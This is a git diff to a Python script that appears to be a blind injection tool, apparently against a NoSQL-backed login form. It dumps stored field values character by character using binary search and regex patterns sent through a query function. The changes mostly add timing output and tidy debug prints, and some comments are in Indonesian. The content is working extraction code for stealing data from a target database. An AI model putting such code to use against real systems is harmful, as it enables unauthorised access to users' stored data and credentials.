@@ -74,6 +74,7 @@ def dumpKnownValue(nsi, form_data, password, v=1):
     
     
 def binarySearchContent(nsi, form_data, index=0, length=1, left=1, right=0x7f,):
+    start_time = time.time()
     while right - left > 4:
         guess = int(left+(right-left)/2)
 
@@ -90,7 +91,7 @@ def binarySearchContent(nsi, form_data, index=0, length=1, left=1, right=0x7f,):
         # print(f"{left} ~ {right}" , end="\r")
         # print(f"{left} ~ {right}")
         # time.sleep(5)
-    start_time = time.time()
+    
     for i in range(left,right+1):
         command = r"^.{%s}[\x{%s}].{%s}" % (index, f"{hex(int(i))[2:]:0>4}", length-index-1)
         # print(command)
@@ -145,7 +146,7 @@ def getPrefix(nsi, form_data):
 
 dump_data = []
 lens = []
-def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1, right = 0x7f, found = ['abcdefghijklm']):
+def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1, right = 0x7f, found = []):
     res_chars = []
     letters_found = username
     # print('row:' + str(row))
@@ -239,10 +240,10 @@ def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1,
         # dump row 1
         ########### ini enumerasi rentang dri sebuah field untuk memperkecil pencarian ###########
         for index in range(1, length+1):
-            print(f'=== masuk bisect {index}: ' + str(right - left > 4) + "=======\n")
-            print(f'LEFT: {left} - RIGHT: {right}')
+            # print(f'=== masuk bisect {index}: ' + str(right - left > 4) + "=======\n")
+            # print(f'LEFT: {left} - RIGHT: {right}')
 
-            print('============BRUTE LENGTH==============')
+            # print('============BRUTE LENGTH==============')
             
             while right - left > 4:
                 guess = int(left+(right-left)/2)
@@ -264,8 +265,8 @@ def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1,
                     right = guess
                     left = old_left
                     
-                # print(f"{left} ~ {right}" , end="\r")
-                print(f"{left} ~ {right}")
+                print(f"{left} ~ {right}" , end="\r")
+                # print(f"{left} ~ {right}")
                 # time.sleep(5)
             
             # enumerasi dengan left dan right sudah diperkecil
@@ -294,6 +295,8 @@ def getDumpDataLength(nsi, username, form_data, found = ""):
     left = 1
     right = 100
     v = 1
+    start_time_len = time.time()
+    total_time = 0
     
     regex_pattern = ""
     if (found != ''):
@@ -330,7 +333,14 @@ def getDumpDataLength(nsi, username, form_data, found = ""):
         # print('COMMAND BRUTE LENGTH::::' + str(r"^%s^%s.{%s}$" % (regex_pattern, username, i)))
         if query(nsi, form_data):
             if v == 1:
+                end_time = time.time()
+                time_taken = end_time - start_time_len
+                total_time += time_taken
+                
                 length = i
+                print(colored(f"Time taken for append {i}: {time_taken}", "yellow", attrs=["blink"]))
+                start_time_len = time.time()
+                total_time = 0
                 # break
     # print(f'length:::: {length}')
     return length
